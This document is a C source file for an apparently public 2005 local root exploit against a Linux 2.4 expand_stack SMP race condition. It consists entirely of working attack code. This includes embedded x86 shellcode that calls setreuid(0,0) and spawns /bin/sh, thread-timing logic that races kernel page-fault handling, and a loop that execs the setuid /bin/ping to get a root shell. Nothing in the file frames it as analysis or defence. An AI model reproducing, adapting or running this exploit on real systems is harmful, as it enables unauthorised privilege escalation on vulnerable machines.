 /*
* expand_stack SMP race local root exploit
*
* Copyright (C) 2005 Christophe Devine and Julien Tinnes
*
* This program is quite unreliable - you may have to run it
* several times before getting a rootshell. It was only tested
* so far on a bi-xeon running Debian testing / Linux 2.4.29-rc1.
*
* Vulnerability discovered by Paul Starzetz <ihaquer at isec.pl>
* http://www.isec.pl/vulnerabilities/isec-0022-pagefault.txt
*
* This program is free software; you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation; either version 2 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program; if not, write to the Free Software
* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
*/

#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>

#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <asm/page.h>

#define PGD_SIZE (PAGE_SIZE * 1024)
#define TARGET_BASE (void *) (PGD1_BASE + PAGE_SIZE)
#define MMAP_BASE (void *) (PGD1_BASE + PAGE_SIZE * 3)
#define PGD1_BASE (void *) 0x50000000
#define PGD2_BASE (void *) 0x60000000
#define MAGIC_TEST 0x18A041DF
#define SUID "/bin/ping"

unsigned char stack1[4096];
unsigned char stack2[4096];
unsigned char stack3[4096];

char exec_sh[] = /* bob <bob@dtors.net> */

/* setreuid(0,0); */
"\x31\xc0" /* xor %eax, %eax */
"\x31\xc3" /* xor %ebx, %ebx */
"\x31\xc1" /* xor %ecx, %ecx */
"\xb0\x46" /* mov $0x46, %al */
"\xcd\x80" /* int $0x80 */

/* execve() of /bin/sh */
"\x31\xc0" /* xor %eax, %eax */
"\x50" /* push %eax */
"\x68\x6e\x2f\x73\x68" /* push $0x68732f6e */
"\x68\x2f\x2f\x62\x69" /* push $0x69622f2f */
"\x89\xe3" /* mov %esp, %ebx */
"\x50" /* push %eax */
"\x89\xe2" /* mov %esp, %edx */
"\x53" /* push %ebx */
"\x89\xe1" /* mov %esp, %ecx */
"\xb0\x0b" /* mov $0x0b, %al */
"\xcd\x80"; /* int $0x80 */

int pid[3], sff;
long long tsc1, tsc2;

void child_sighandler( int signum )
{
int *xs1, i, j;

if( signum == SIGUSR1 )
{
for( i = 0; i > sff; i-- ) j = i * i;

asm volatile( "rdtsc" : "=A" (tsc1) );
xs1 = TARGET_BASE; *xs1 = MAGIC_TEST;
signal( SIGUSR1, child_sighandler );
}

if( signum == SIGALRM )
{
printf( " [-] unable to exploit race in 30s,\n"
" kernel patched or load too high.\n" );
exit( 2 );
}
}

int child1_thread( void *arg )
{
printf( " [+] in thread 1 (pid = %d)\n", getpid() );
signal( SIGUSR1, child_sighandler );
while( 1 ) sleep( 4 );
return( 0 );
}

int test_race_result( void )
{
FILE *f;
int *mtest;
char line[128];

unsigned int vma_start_prev;
unsigned int vma_start;
unsigned int vma_end;

if( ( f = fopen( "/proc/self/maps", "r" ) ) == NULL )
{
perror( " [-] fopen /proc/self/maps" );
exit( 1 );
}

mtest = TARGET_BASE;

vma_start_prev = 0;

while( fgets( line, sizeof( line ) - 1, f ) != NULL )
{
sscanf( line, "%08x-%08x", &vma_start, &vma_end );

if( vma_start == (int) MMAP_BASE - PAGE_SIZE &&
vma_end == (int) MMAP_BASE + PAGE_SIZE &&
vma_start_prev != (int) TARGET_BASE &&
*mtest == MAGIC_TEST )
return( 0 );

vma_start_prev = vma_start;
}

fclose( f );

return( 1 );
}

int child2_thread( void *arg )
{
long delta[8];
int *xs2, i, j, fct;

usleep( 50000 );
printf( " [+] in thread 2 (pid = %d)\n", getpid() );

signal( SIGALRM, child_sighandler );
alarm( 30 );

asm volatile( "rdtsc" : "=A" (tsc1) );
for( i = 0; i < 4096; i++ ) j = i * i;
asm volatile( "rdtsc" : "=A" (tsc2) );
fct = tsc2 - tsc1;

printf( " [+] rdtsc calibration: %d\n", fct );

for( i = 0; i < 8; i++ )
delta[i] = 0;

tsc1 = tsc2 = 0;

printf( " [+] exploiting race, wait...\n" );

while( 1 )
{
if( mmap( MMAP_BASE, 0x1000, PROT_READ | PROT_WRITE,
MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE |
MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( " [-] mmap target" );
return( 1 );
}

j = 0;
for( i = 0; i < 8; i++ )
j += delta[i];
j /= 8;

sff += ( 128 * j ) / fct;

if( sff < -16384 || sff > 16384 )
sff = 0;

for( i = 7; i > 0; i-- )
delta[i] = delta[i - 1];

delta[0] = tsc1 - tsc2;

kill( pid[0], SIGUSR1 );

for( i = 0; i < sff; i++ ) j = i * i;

asm volatile( "rdtsc" : "=A" (tsc2) );
xs2 = MMAP_BASE - PAGE_SIZE; *xs2 = 0;

if( test_race_result() == 0 )
{
usleep( 10000 );

if( test_race_result() == 0 )
break;
}

munmap( TARGET_BASE, PAGE_SIZE * 3 );
}

printf( " [+] race won (shift: %d)\n", sff );

return( 0 );
}

int child3_thread( void *arg )
{
char *argv[2], *envp[1];

argv[0] = (char *) arg;
argv[1] = NULL;
envp[0] = NULL;

execve( (char *) arg, argv, envp );

exit( 0 );
}

int main( void )
{
int nb_cpu, s, n;
char line[1024];
FILE *f;
void *x;

if( ( f = fopen( "/proc/cpuinfo", "r" ) ) == NULL )
{
perror( " [-] fopen /proc/cpuinfo" );
return( 1 );
}

nb_cpu = 0;

while( fgets( line, sizeof( line ) - 1, f ) != NULL )
if( memcmp( line, "processor", 9 ) == 0 )
nb_cpu++;

fclose( f );

if( nb_cpu <= 1 )
{
fprintf( stderr, "This program only works on SMP systems.\n" );
return( 1 );
}

printf( "\n" );

if( mmap( PGD1_BASE, PAGE_SIZE, PROT_READ, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE, 0, 0 ) == (void *) -1 )
{
perror( "mmap pgd1 base\n" );
return( 1 );
}

n = *((int *) PGD1_BASE );

if( mmap( PGD2_BASE, PAGE_SIZE, PROT_READ, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE, 0, 0 ) == (void *) -1 )
{
perror( "mmap pgd2 base\n" );
return( 1 );
}

n = *((int *) PGD2_BASE );

if( ( pid[0] = clone( child1_thread, stack1 + PAGE_SIZE,
SIGCHLD | CLONE_VM, 0 ) ) == -1 )
{
perror( " [-] clone child1" );
return( 1 );
}

if( ( pid[1] = clone( child2_thread, stack2 + PAGE_SIZE,
SIGCHLD | CLONE_VM, 0 ) ) == -1 )
{
perror( " [-] clone child2" );
kill( pid[0], SIGKILL );
return( 1 );
}

waitpid( pid[1], &s, 0 );
kill( pid[0], SIGKILL );

if( WEXITSTATUS(s) != 0 )
return( 1 );

x = (void *) ( TARGET_BASE );
memset( (void *) x, 0x90, PAGE_SIZE );
n = 16 + ( sizeof( exec_sh ) & 0xFFF0 );
memcpy( x + PAGE_SIZE - n, exec_sh, n );

munmap( PGD1_BASE, PGD_SIZE );
munmap( PGD2_BASE, PGD_SIZE );

for( n = 0; n < 256; n++ )
{
if( ( pid[0] = clone( child3_thread, stack1 + PAGE_SIZE,
SIGCHLD | CLONE_VM, SUID ) ) == -1 )
{
perror( " [-] clone child3" );
return( 1 );
}

if( ( pid[1] = clone( child3_thread, stack2 + PAGE_SIZE,
SIGCHLD | CLONE_VM, SUID ) ) == -1 )
{
perror( " [-] clone child3" );
return( 1 );
}

waitpid( pid[0], &s, 0 );
if( WEXITSTATUS(s) != 2 ) break;

waitpid( pid[1], &s, 0 );
if( WEXITSTATUS(s) != 2 ) break;
}

return( 0 );
}